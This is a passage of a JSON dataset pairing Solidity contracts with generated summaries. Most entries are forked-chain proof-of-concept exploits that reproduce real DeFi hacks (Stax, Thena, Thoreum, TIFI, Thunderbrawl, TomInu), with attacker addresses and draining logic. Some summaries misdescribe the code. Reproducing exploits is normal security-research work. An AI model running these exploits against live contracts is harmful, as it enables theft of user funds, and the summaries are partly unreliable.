        "summary": "This code implements a smart contract that exploits a vulnerability in a vulnerable smart contract, causing a loss of multiple tokens worth ~$15.8M US$. The vulnerable contract had a lack of check function parameter legitimacy, which allowed the attacker to manipulate the contract's behavior. The attacker uses the vulnerable contract to lock some tokens and then migrates liquidity from some Uniswap V2-compatible pairs to Uniswap V3, resulting in the loss of tokens from the vulnerable contract. The code includes pre-works for locking tokens and extending lock duration, functions for migrating liquidity from specific pairs, and a function for swapping one token for another using Curve's 3pool.",
        "id": "a470f14e-8b7b-4d73-812b-67f1d746235a"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n/*\nAttacker: 0x9c9fb3100a2a521985f0c47de3b4598dafd25b01\n\nAttacker contract: 0x2df9c154fe24d081cfe568645fb4075d725431e0\n\nVulnerable contract: 0xd2869042e12a3506100af1d192b5b04d65137941\n\nAttack tx: 0x8c3f442fc6d640a6ff3ea0b12be64f1d4609ea94edd2966f42c01cd9bdcf04b5\n\nRoot cause: Insufficient access control to the migrateStake function.\n*/\n\ninterface IStaxLPStaking {\n    function migrateStake(address oldStaking, uint256 amount) external;\n    function withdrawAll(bool claim) external;\n}\n\ncontract ContractTest is DSTest {\n  CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  IERC20 xFraxTempleLP = IERC20(0xBcB8b7FC9197fEDa75C101fA69d3211b5a30dCD9);\n  IStaxLPStaking StaxLPStaking = IStaxLPStaking(0xd2869042E12a3506100af1D192b5b04D65137941);\n\n\n  function setUp() public {\n    cheat.createSelectFork(\"mainnet\", 15725066); // fork mainnet at block 15725066\n  }\n\n  function testExploit() public {\n\n    uint lpbalance = xFraxTempleLP.balanceOf(address(StaxLPStaking));  \n\n    StaxLPStaking.migrateStake(address(this),lpbalance);\n    \n    console.log(\"Perform migrateStake\");\n\n    StaxLPStaking.withdrawAll(false);\n    console.log(\"Perform withdrawAll\");\n    console.log(\"After exploiting, xFraxTempleLP balance:\", xFraxTempleLP.balanceOf(address(this))/1e18);\n  }\n\n   function migrateWithdraw(address, uint256) public //callback\n   {\n\n   }\n}\n",
        "summary": "This is a Solidity smart contract that is testing an exploit on a vulnerable contract called `IStaxLPStaking`. The contract imports a cheat contract, an interface definition for the vulnerable contract, and an ERC20 token interface. \n\nThe `setUp()` function creates a fork of Mainnet at a specific block number. \n\nThe `testExploit()` function performs a migration of stake from the `IStaxLPStaking` contract to the current contract. It then calls the `withdrawAll` function on the `IStaxLPStaking` contract and checks the balance of a specific ERC20 token. \n\nThe `migrateWithdraw()` function is defined but is blank and is only there as a callback.",
        "id": "1e9d9a73-2135-4656-8ba0-ee3059613835"
    },
    {
        "code": "pragma solidity ^0.4.0;\n\nimport \"browser/library.sol\";\n\ncontract TestLibrary {\n    using IntExtended for uint;\n    \n    function testIncrement(uint _base) public pure returns (uint) {\n        return IntExtended.increment(_base);\n    }\n    \n    function testDecrement(uint _base) public pure returns (uint) {\n        return IntExtended.decrement(_base);\n    }\n    \n    function testIncrementByValue(uint _base, uint _value) public pure returns (uint) {\n        return _base.incrementByValue(_value);\n    }\n    \n    function testDecrementByValue(uint _base, uint _value) public pure returns (uint) {\n        return _base.decrementByValue(_value);\n    }\n}\n",
        "summary": "This code imports a library called \"IntExtended\", which extends the functionality of the built-in uint data type. It defines a contract called \"TestLibrary\" which uses the library and provides four functions:\n\n1. \"testIncrement\" takes a uint argument and returns the uint that is one greater than the argument.\n2. \"testDecrement\" takes a uint argument and returns the uint that is one less than the argument.\n3. \"testIncrementByValue\" takes two uint arguments, adds the second to the first, and returns the result.\n4. \"testDecrementByValue\" takes two uint arguments, subtracts the second from the first, and returns the result.\n\nAll of these functions are declared as \"pure\" - meaning they don't modify any state on the blockchain and only perform calculations on their inputs.",
        "id": "8f8bee40-8c06-452a-9166-83caf9a7fddb"
    },
    {
        "code": "pragma solidity ^0.4.0;\n\nimport \"browser/Strings.sol\";\n\ncontract TestStrings {\n    \n    using Strings for string;\n    \n    function testConcat(string _base) public pure returns (string) {\n        return _base.concat(\"_suffix\");\n    }\n    \n    function needleInHaystack(string _base) public pure returns (int) {\n        return _base.strpos(\"t\");\n    }\n}\n",
        "summary": "This is a Solidity smart contract that makes use of the external library called \"Strings\" to perform string operations. \n\nThe `TestString` contract defines two functions: `testConcat` and `needleInHaystack`. \n\n`testConcat` takes a string `_base` as an input parameter and returns the concatenated string with \"_suffix\" appended at the end.\n\n`needleInHaystack` takes a string `_base` as an input parameter and finds the position of the first occurrence of the character \"t\" in the string. If it is found, it returns the index of \"t\", otherwise, it returns -1. \n\nBoth functions are declared as `public pure`, which means they can be called from outside the contract and they do not change the state of the blockchain. Finally, the contract needs to import the \"Strings\" library using the `import` statement.",
        "id": "ebf89552-adde-4e5f-8b0c-024d0a090d87"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ninterface IERC721Receiver {\n    function onERC721Received(\n        address operator,\n        address from,\n        uint256 tokenId,\n        bytes calldata data\n    ) external returns (bytes4);\n}\ninterface HouseWallet{\n    function winners(uint256 id, address player) view external returns(uint256);\n    function claimReward(\n        uint256 _ID,\n        address payable _player,\n        uint256 _amount,\n        bool _rewardStatus,\n        uint256 _x,\n        string memory name,\n        address _add\n    ) external;\n    function shoot(\n        uint256 random,\n        uint256 gameId,\n        bool feestate,\n        uint256 _x,\n        string memory name,\n        address _add,\n        bool nftcheck,\n        bool dystopianCheck\n    ) external payable;\n}\n\ncontract ContractTest is DSTest{\n\n    HouseWallet houseWallet = HouseWallet(0xae191Ca19F0f8E21d754c6CAb99107eD62B6fe53);\n    uint256 randomNumber =  12345678000000000000000000;\n\n    uint256 gameId = 1;\n    bool feestate = false;\n     // sha256(abi.encode(_x, name, _add)) == hashValueTwo maybe off-chain calculate\n    uint256 _x = 2845798969920214568462001258446;\n    string  name = \"HATEFUCKINGHACKERSTHEYNEVERCANHACKTHISIHATEPREVIOUS\";\n    address _add = 0x6Ee709bf229c7C2303128e88225128784c801ce1;\n\n    bool nftcheck = true;\n    bool dystopianCheck = true;\n\n    address payable add = payable(address(this));\n    bool _rewardStatus = true;\n    // sha256(abi.encode(_x, name, _add)) == hashValue  maybe off-chain calculate\n    uint256 _x1 = 969820990102090205468486;\n    string name1 = \"WELCOMETOTHUNDERBRAWLROULETTENOWYOUWINTHESHOOTINGGAME\";\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    IERC721 THBR = IERC721(0x72e901F1bb2BfA2339326DfB90c5cEc911e2ba3C); // Thunderbrawl Roulette Contract\n        \n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 21785004);\n    }\n\n    function testExploit() public{\n\n        emit log_named_uint(\n            \"Attacker THBR balance before exploit\",\n            THBR.balanceOf(address(this))\n        );\n\n        houseWallet.shoot{value: 0.32 ether}(randomNumber, gameId, feestate, _x, name, _add, nftcheck, dystopianCheck);\n        uint256 _amount = houseWallet.winners(gameId, add);\n        houseWallet.claimReward(gameId, add, _amount, _rewardStatus, _x1, name1, _add);\n\n        emit log_named_uint(\n            \"Attacker THBR balance after exploit\",\n            THBR.balanceOf(address(this))\n        );\n\n    }\n\n    receive() external payable {}\n\n    function onERC721Received(\n        address _operator, \n        address _from, \n        uint256 _tokenId, \n        bytes calldata _data\n        ) \n        payable \n        external \n        returns (bytes4){\n            uint256 _amount = houseWallet.winners(gameId, add);\n            if(address(houseWallet).balance >= _amount * 2){\n                houseWallet.claimReward(gameId, add, _amount, _rewardStatus, _x1, name1, _add);\n            }\n            return this.onERC721Received.selector;\n        }\n}",
        "summary": "This code defines a smart contract named \"ContractTest\" that interacts with two external contracts: \"HouseWallet\" and \"THBR\". It also imports an interface named \"IERC721Receiver\" and another external contract named \"CheatCodes\". \n\nThe smart contract deploys on Solidity version 0.8.10 and requires the UNLICENSED SPDX license. \n\nThe \"HouseWallet\" contract has two view functions and two external functions that can be called by this contract: \"claimReward\" and \"shoot\". \n\nThe smart contract has a function named \"setUp\" that does not take input arguments and it initializes a fork for conducting tests. \n\nThere is a function named \"testExploit\" that interacts with the \"HouseWallet\" contract. It executes two transactions in sequence: It first calls the \"shoot\" function of the \"HouseWallet\" contract. Then, it calls the \"claimReward\" function of the \"HouseWallet\" contract, which executes a payout and sends rewards back to the invoker's address. The \"testExploit\" function logs the balance of the \"THBR\" contract before and after the transactions. \n\nFinally, there is a receive function that is triggered when the contract receives tokens and sends them back to the calling address.",
        "id": "9c1ff605-d3ec-4345-a08c-4a2ff5d14c11"
    },
    {
        "code": "\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/LTV888/status/1640563457094451214?t=OBHfonYm9yYKvMros6Uw_g&s=19\n// @Tx\n// https://bscscan.com/tx/0xdf6252854362c3e96fd086d9c3a5397c303d265649aee0b023176bb49cf00d4b\n\ninterface IThenaRewardPool {\n    function unstake(address,uint256,address,bool) external;\n}\n\ninterface IVolatileV1 {\n    function metadata() external view returns (uint dec0, uint dec1, uint r0, uint r1, bool st, address t0, address t1);\n    function claimFees() external returns (uint, uint);\n    function tokens() external view returns (address, address);\n    function transferFrom(address src, address dst, uint amount) external returns (bool);\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n    function burn(address to) external returns (uint amount0, uint amount1);\n    function mint(address to) external returns (uint liquidity);\n    function getReserves() external view returns (uint _reserve0, uint _reserve1, uint _blockTimestampLast);\n    function getAmountOut(uint, address) external view returns (uint);\n\n    function name() external view returns(string memory);\n    function symbol() external view returns(string memory);\n    function totalSupply() external view returns (uint);\n    function decimals() external view returns (uint8);\n\n    function claimable0(address _user) external view returns (uint);\n    function claimable1(address _user) external view returns (uint);\n\n    function isStable() external view returns(bool);\n}\n\ncontract ContractTest is Test {\n\n    IERC20 THENA = IERC20(0xF4C8E32EaDEC4BFe97E0F595AdD0f4450a863a11);\n    IERC20 BUSD  = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);\n    IERC20 wUSDR = IERC20(0x2952beb1326acCbB5243725bd4Da2fC937BCa087);\n    IThenaRewardPool pool = IThenaRewardPool(0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F);\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    Uni_Router_V2 Router = Uni_Router_V2(0x20a304a7d126758dfe6B243D0fc515F83bCA8431);\n    Uni_Pair_V2 USDC_BUSD = Uni_Pair_V2(0x618f9Eb0E1a698409621f4F487B563529f003643);\n    IVolatileV1 wUSDR_USDC = IVolatileV1(0xA99c4051069B774102d6D215c6A9ba69BD616E6a);\n\n    MockThenaRewardPool mock;\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 26_834_149);\n        cheats.label(address(THENA), \"THENA\");\n        cheats.label(address(USDC), \"USDC\");\n        cheats.label(address(BUSD), \"BUSD\");\n        cheats.label(address(pool), \"ThenaRewardPool\");\n        cheats.label(address(Router), \"UniV2Router\");\n        cheats.label(address(USDC_BUSD), \"USDC_BUSD\");\n        cheats.label(address(wUSDR), \"wUSDR\");\n        cheats.label(address(wUSDR_USDC), \"wUSDR_USDC\");\n    }\n\n    function testExploit() external {\n        mock = new MockThenaRewardPool();\n        emit log_named_decimal_uint(\n            \"Attacker BUSD balance after exploit\", BUSD.balanceOf(address(this)), BUSD.decimals()\n        );\n    }\n}\n\ncontract MockThenaRewardPool {\n    IThenaRewardPool pool = IThenaRewardPool(0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F);\n    IERC20 BUSD  = IERC20(0x55d398326f99059fF775485246999027B3197955);\n\n    constructor() {\n        unstake(address(BUSD), 0, address(this), true);\n    }\n\n    function unstake(address _token,uint256 _amount,address _pool,bool _sign) internal {\n        pool.unstake(_token, _amount, _pool, _sign);\n        BUSD.transfer(msg.sender, BUSD.balanceOf(address(this)));\n    }\n}\n",
        "summary": "The code is a Solidity contract that imports various other contracts/interfaces and defines some data structures. It sets up a testing environment and creates a function testExploit() that instantiates a MockThenaRewardPool contract. The MockThenaRewardPool contract includes a constructor that transfers BUSD tokens from the contract to the message sender by calling the unstake() function of the IThenaRewardPool contract. The contract is intended for testing and exploring for certain exploits.",
        "id": "1bc183cc-1db0-4fdc-8691-bf8b539f6be3"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @KeyInfo - Total Lost : ~2000 BNB (6 BNB in this tx)\n// Attacker : 0x1ae2dc57399b2f4597366c5bf4fe39859c006f99\n// Attack Contract : 0x7d1e1901226e0ba389bfb1281ede859e6e48cc3d\n// Vulnerable Contract : 0xce1b3e5087e8215876af976032382dd338cf8401\n// Attack Tx : https://bscscan.com/tx/0x3fe3a1883f0ae263a260f7d3e9b462468f4f83c2c88bb89d1dee5d7d24262b51\n\n// @Info\n// Vulnerable Contract Code : https://bscscan.com/token/0xce1b3e5087e8215876af976032382dd338cf8401#code\n\n\n// @Analysis\n// Ancilia : https://twitter.com/AnciliaInc/status/1615944396134043648\n\nCheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\nIPancakeRouter constant router = IPancakeRouter(payable(0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8));\n\n\naddress constant  wbnb_addr  = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;\naddress constant  thoreum_addr = 0xCE1b3e5087e8215876aF976032382dd338cF8401;\naddress constant  wbnb_thoreum_lp_addr = 0xd822E1737b1180F72368B2a9EB2de22805B67E34;\naddress constant  exploiter = 0x1285FE345523F00AB1A66ACD18d9E23D18D2e35c;\nIWBNB constant wbnb = IWBNB(payable(wbnb_addr));\nTHOREUMInterface constant THOREUM = THOREUMInterface(thoreum_addr);  \n\n\n\ncontract Attacker is Test{\n    //  forge test --contracts ./src/test/ThoreumFinance_exp.sol -vvv\n    function setUp() public {\n        cheat.label(address(router), \"router\");\n        cheat.label(thoreum_addr, \"thoreum\");\n        cheat.label(exploiter, \"exploiter\");\n        cheat.label(wbnb_addr, \"wbnb\");\n        cheat.label(wbnb_thoreum_lp_addr, \"wbnb_thoreum_lp\");\n        cheat.createSelectFork(\"bsc\", 24913171);\n    }\n      \n    function testExploit() public{\n        Exploit exploit = new Exploit();\n        emit log_named_decimal_uint(\"[start] Attacker wbnb Balance\", wbnb.balanceOf(exploiter), 18);        \n        exploit.harvest();\n        emit log_named_decimal_uint(\"[End] Attacker wbnb Balance\",wbnb.balanceOf(exploiter), 18);        \n    }\n}\n\n\ncontract Exploit is Test{ \n   function  harvest()  public   { \n\n        //  step1: get some  thoreum token\n        vm.deal(address(this), 0.003 ether);\n        wbnb.deposit{value:0.003 ether}();\n        wbnb.approve(address(router),type(uint256).max);\n        address [] memory path = new address[](2);\n        path[0] = address(wbnb);\n        path[1] = address(THOREUM);\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(0.003 ether, 0, path, address(this), block.timestamp );\n        emit log_named_decimal_uint(\"[INFO] address(this) thoreum  balance : \", THOREUM.balanceOf(address(this)), 18);\n        \n        //  step2: loop transfer function 15 times\n        for(uint i = 0; i < 15; i++){\n        THOREUM.transfer(address(this), THOREUM.balanceOf(address(this)));\n        emit log_named_decimal_uint(\"[INFO] address(this) thoreum  balance : \", THOREUM.balanceOf(address(this)), 18);\n        }\n\n        //step3: swap thoreum to wbnb\n        THOREUM.approve(address(router), type(uint256).max);\n        wbnb.approve(wbnb_thoreum_lp_addr, type(uint256).max);\n        address [] memory path2 = new address[](2);\n        path2[0] = address(THOREUM);\n        path2[1] = address(wbnb);\n        emit log_named_decimal_uint(\"[INFO] address(this) thoreum  balance : \", THOREUM.balanceOf(address(this)), 18);\n        while(THOREUM.balanceOf(address(this)) > 40000 ether){\n           emit log_named_decimal_uint(\"[INFO] address(exploiter) wbnb  balance : \", wbnb.balanceOf(exploiter), 18);\n          router.swapExactTokensForTokensSupportingFeeOnTransferTokens(40000 ether, 0, path2, exploiter, block.timestamp );\n        }\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(THOREUM.balanceOf(address(this)), 0, path2, exploiter, block.timestamp );\n   }\n\n\n    receive() external payable {}\n}\n\ninterface THOREUMInterface is IERC20{\n    function deposit() payable external;\n    function withdraw(uint256 wad) external; \n}",
        "summary": "This code consists of two contracts: Attacker and Exploit. Attacker is a test contract that initializes constants and sets up the environment to trigger the exploit in the Exploit contract. Exploit implements a malicious attack on the Thoreum Finance smart contract by performing a sequence of transactions. The attack involves repeatedly sending a certain amount of THOREUM tokens to the attacker\u2019s address, then swapping the THOREUM tokens for BNB, exploiting a vulnerability in Thoreum\u2019s contract, and transferring the BNB tokens to the attacker\u2019s address.",
        "id": "b2703430-f909-45cf-b5a0-087127485a76"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/peckshield/status/1601492605535399936\n// @TX\n// https://bscscan.com/tx/0x1c5272ce35338c57c6b9ea710a09766a17bbf14b61438940c3072ed49bfec402\n\ninterface TIFIFinance{\n    function deposit(address token, uint256 amount) external;\n    function borrow(address qToken, uint256 amount) external;\n}\n\ncontract ContractTest is DSTest{\n    TIFIFinance TIFI = TIFIFinance(0x8A6F7834A9d60090668F5db33FEC353a7Fb4704B);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    Uni_Router_V2 TIFIRouter = Uni_Router_V2(0xC8595392B8ca616A226dcE8F69D9E0c7D4C81FE4);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16);\n    IERC20 TIFIToken = IERC20(0x17E65E6b9B166Fb8e7c59432F0db126711246BC0);\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);\n\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 23778726);\n    }\n\n    function testExploit() public{\n        WBNB.approve(address(TIFIRouter), type(uint).max);\n        BUSD.approve(address(TIFI), type(uint).max);\n        TIFIToken.approve(address(Router), type(uint).max);\n        Pair.swap(5 * 1e18, 500 * 1e18, address(this), new bytes(1));\n        \n        emit log_named_decimal_uint(\n            \"[End] Attacker WBNB balance after exploit\",\n            WBNB.balanceOf(address(this)),\n            18\n        );\n    }\n\n    function pancakeCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{\n        TIFI.deposit(address(BUSD), BUSD.balanceOf(address(this)));\n        WBNBToBUSD(); // change the reserve of WBNB - BUSD\n        TIFI.borrow(address(TIFIToken), TIFIToken.balanceOf(address(TIFI))); //call getReserves of WBNB - BUSD LP and borrow TIFI TOKEN  \n        TIFIToWBNB();\n        WBNB.transfer(address(Pair), 7 * 1e18);\n    }\n\n    function WBNBToBUSD() internal{\n        address [] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(BUSD);\n        TIFIRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            WBNB.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function TIFIToWBNB() internal{\n        address [] memory path = new address[](2);\n        path[0] = address(TIFIToken);\n        path[1] = address(WBNB);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            TIFIToken.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n \n    \n}\n",
        "summary": "This is a Solidity smart contract that tests an exploit on the TIFI Finance protocol and Uniswap V2. The `setUp()` function creates a fork on the BSC network, and the `testExploit()` function executes the exploit that involves swapping tokens on the Uniswap V2 to manipulate the trading pair's reserve and borrow TIFI tokens from the TIFI protocol with collateral. The `pancakeCall()` function is a callback function that is triggered by Uniswap V2 when the manipulated token swap occurs. The contract imports several interfaces and dependencies, including the TIFI Finance interface, Uniswap V2 router and pair interfaces, and the ERC20 token interface. The contract emits a log of the attacker's final WBNB balance after the exploit is executed.",
        "id": "6c3e957a-dbb5-419c-9220-3ff689277dd8"
    },
    {
        "code": "// This code has not been professionally audited, therefore I cannot make any promises about\n// safety or correctness. Use at own risk.\n\npragma solidity ^0.4.20;\n\ncontract StructPackingExample {\n\n    struct CheapStruct {\n        uint8 a;\n        uint8 b;\n        uint8 c;\n        uint8 d;\n        bytes1 e;\n        bytes1 f;\n        bytes1 g;\n        bytes1 h;\n    }\n\n    CheapStruct example;\n\n    function addCheapStruct() public {\n        CheapStruct memory someStruct = CheapStruct(1,2,3,4,\"a\",\"b\",\"c\",\"d\");\n        example = someStruct;\n    }\n}\n",
        "summary": "This Solidity code declares a contract named StructPackingExample that contains a struct named CheapStruct. CheapStruct contains eight elements: four uint8 values, and four bytes1 values. The example instance of the CheapStruct is declared. The code defines a function named addCheapStruct that creates an instance of the CheapStruct and assigns it to the example instance. This code is not guaranteed to be safe or correct, as it has not been professionally audited.",
        "id": "f16c09ed-d565-4ba9-8368-5e9ff8a3395c"
    },
    {
        "code": "pragma solidity ^0.4.20;\ncontract CheapStructPackingExample {\n\n    struct CheapStruct {\n        uint8 a; //uses 1 byte writes in new slot\n        uint8 b; //uses 1 byte writes in previous slot\n        uint8 c; //uses 1 byte writes in previous slot\n        uint8 d; //uses 1 byte writes in previous slot\n        bytes1 e; //uses 1 byte writes in previous slot\n        bytes1 f; //uses 1 byte writes in previous slot\n        bytes1 g; //uses 1 byte writes in previous slot\n        bytes1 h; //uses 1 byte writes in previous slot\n    }\n\n    CheapStruct example;\n\n    function addCheapStruct() public {\n        CheapStruct memory someStruct = CheapStruct(1,2,3,4,\"a\",\"b\",\"c\",\"d\");\n        example = someStruct;\n    }\n}\n\ncontract ExpensiveStructPackingExample {\n\n    struct ExpensiveStruct {\n        uint64 a; //uses 8 bytes\n        bytes32 e; //uses 32 bytes writes in new slot\n        uint64 b; //uses 8 bytes writes in new slot\n        bytes32 f; //uses 32 bytes writes in new slot\n        uint32 c; //uses 4 bytes writes in new slot\n        bytes32 g; //uses 32 bytes writes in new slot\n        uint8 d; //uses 1 byte writes in new slot\n        bytes32 h; //uses 32 bytes writes in new slot\n    }\n\n    ExpensiveStruct example;\n\n    function addExpensiveStruct() public {\n        ExpensiveStruct memory someStruct = ExpensiveStruct(1,\"a\",2,\"b\",3,\"c\",4,\"d\");\n        example = someStruct;\n    }\n}\n",
        "summary": "The code defines two contracts, each of which defines a different struct. The first struct `CheapStruct` is designed to pack its data in the most efficient manner possible, several variables share the same storage space. The second struct `ExpensiveStruct` uses more storage space, each variable gets its own slot. Each contract also defines a function that creates an instance of the respective struct and assigns it to a member variable.",
        "id": "7a9ae95e-1114-4e05-848f-0be61a21ea1e"
    },
    {
        "code": "pragma solidity ^0.5.0;\n\ncontract TimeBased {\n    \n    mapping(address => uint) public _balanceOf;\n    mapping(address => uint) public _expiryOf;\n    \n    uint private leaseTime = 600;\n    \n    modifier expire(address _addr) {\n        if (_expiryOf[_addr] >= block.timestamp) {\n            _expiryOf[_addr] = 0;\n            _balanceOf[_addr] = 0;\n        }\n        _;\n    }\n    \n    function lease()\n        public\n        payable\n        expire(msg.sender)\n        returns (bool) {\n        require(msg.value == 1 ether);\n        require(_balanceOf[msg.sender] == 0);\n        _balanceOf[msg.sender] = 1;\n        _expiryOf[msg.sender] = block.timestamp + leaseTime;\n        return true;\n    }\n    \n    function balanceOf() \n        public\n        returns (uint) {\n        return balanceOf(msg.sender);        \n    }\n    \n    function balanceOf(address _addr)\n        public\n        expire(_addr)\n        returns (uint) {\n        return _balanceOf[_addr];\n    }\n    \n    function expiryOf() \n        public\n        returns (uint) {\n        return expiryOf(msg.sender);        \n    }\n    \n    function expiryOf(address _addr)\n        public\n        expire(_addr)\n        returns (uint) {\n        return _expiryOf[_addr];\n    }\n}",
        "summary": "This Solidity smart contract defines a TimeBased contract that allows users to lease their balance for a period of time by calling the `lease()` function and sending 1 ether as payment. The balance and expiry time of each user are stored in the `_balanceOf` and `_expiryOf` mapping, respectively. The `expire()` modifier checks if a user's lease has expired before each function call and resets their balance and expiry time to zero if necessary. The `balanceOf()` and `expiryOf()` functions return the balance and expiry time of a user's lease, respectively. The contract has a lease time of 600 seconds, so users must renew their lease after this time period to continue using the contract.",
        "id": "0c11e918-62f6-4e48-ab69-48b113702365"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// By 0xAA\npragma solidity ^0.8.4;\nimport \"openzeppelin-contracts/token/ERC721/ERC721.sol\";\n\ncontract TimeManipulation is ERC721 {\n    uint256 totalSupply;\n\n    // \u6784\u9020\u51fd\u6570\uff0c\u521d\u59cb\u5316NFT\u5408\u96c6\u7684\u540d\u79f0\u3001\u4ee3\u53f7\n    constructor() ERC721(\"\", \"\"){}\n\n    // \u94f8\u9020\u51fd\u6570\uff1a\u5f53\u533a\u5757\u65f6\u95f4\u80fd\u88ab7\u6574\u9664\u65f6\u624d\u80fdmint\u6210\u529f\n    function luckyMint() external returns(bool success){\n        if(block.timestamp % 170 == 0){\n            _mint(msg.sender, totalSupply); // mint\n            totalSupply++;\n            success = true;\n        }else{\n            success = false;\n        }\n    }\n}",
        "summary": "This code is a smart contract written in Solidity language that creates an ERC721 non-fungible token (NFT) collection called \"TimeManipulation\". The contract has a function called \"luckyMint\" that allows the owner to mint a new NFT only if the block timestamp is divisible by 170. The total number of NFTs that have been minted is tracked by the variable \"totalSupply\".",
        "id": "4b848d68-0914-4ca5-828e-1578e4104255"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.4;\n\nimport \"forge-std/Test.sol\";\nimport \"forge-std/console.sol\";\nimport \"../src/TimeManipulation.sol\";\n\ncontract TimeManipulationTest is Test {\n    TimeManipulation public nft;\n\n    // Computes address for a given private key\n    address alice = vm.addr(1);\n\n    function setUp() public {\n        nft = new TimeManipulation();\n    }\n\n    // forge test -vv --match-test  testMint\n    function testMint() public {\n        console.log(\"Condition 1: block.timestamp % 170 != 0\");\n        // Set block.timestamp to 169\n        vm.warp(169);\n        console.log(\"block.timestamp: %s\", block.timestamp);\n        // Sets all subsequent calls' msg.sender to be the input address\n        // until `stopPrank` is called\n        vm.startPrank(alice);\n        console.log(\"alice balance before mint: %s\", nft.balanceOf(alice));\n        nft.luckyMint();\n        console.log(\"alice balance after mint: %s\", nft.balanceOf(alice));\n\n        // Set block.timestamp to 17000\n        console.log(\"Condition 2: block.timestamp % 170 == 0\");\n        vm.warp(17000);\n        console.log(\"block.timestamp: %s\", block.timestamp);\n        console.log(\"alice balance before mint: %s\", nft.balanceOf(alice));\n        nft.luckyMint();\n        console.log(\"alice balance after mint: %s\", nft.balanceOf(alice));\n        vm.stopPrank();\n    }\n}\n",
        "summary": "This is a Solidity smart contract that tests the functionality of another smart contract called \"TimeManipulation\". The testing contract imports the \"Test\" and \"console\" libraries from Forge-std and the \"TimeManipulation\" contract. The contract has a function called \"setUp\" that sets up an instance of the \"TimeManipulation\" contract. There is also a function named \"testMint\" which has multiple test cases. This function tests the \"luckyMint\" function of the \"TimeManipulation\" contract by setting the block timestamp to certain values, mocking the sender address, and minting new tokens. The console is used to print different values during the tests.",
        "id": "35b5ac26-86b9-49e3-b645-ce41aaf707e4"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.17;\n\nimport \"forge-std/Test.sol\";\n\n// Total lost: 22 ETH\n// Attacker: 0x14d8ada7a0ba91f59dc0cb97c8f44f1d177c2195\n// Attack Contract: 0xdb2d869ac23715af204093e933f5eb57f2dc12a9\n// Vulnerable Contract: 0x2d0e64b6bf13660a4c0de42a0b88144a7c10991f\n// Attack Tx: https://phalcon.blocksec.com/tx/eth/0x6200bf5c43c214caa1177c3676293442059b4f39eb5dbae6cfd4e6ad16305668\n//            https://etherscan.io/tx/0x6200bf5c43c214caa1177c3676293442059b4f39eb5dbae6cfd4e6ad16305668\n\n// @Analysis\n// https://twitter.com/libevm/status/1618731761894309889\n\ncontract TomInuExploit is Test {\n    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    reflectiveERC20 private constant TINU = reflectiveERC20(0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F);\n\n    IBalancerVault private constant balancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);\n    IRouter private constant router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n    IUniswapV2Pair private constant TINU_WETH = IUniswapV2Pair(0xb835752Feb00c278484c464b697e03b03C53E11B);\n\n    function testHack() external {\n        vm.createSelectFork(\"https://eth.llamarpc.com\", 16489408);\n\n        // flashloan WETH from Balancer\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(WETH);\n\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 104.85 ether;\n\n        balancerVault.flashLoan(address(this), tokens, amounts, \"\");\n    }\n\n    function receiveFlashLoan(\n        reflectiveERC20[] 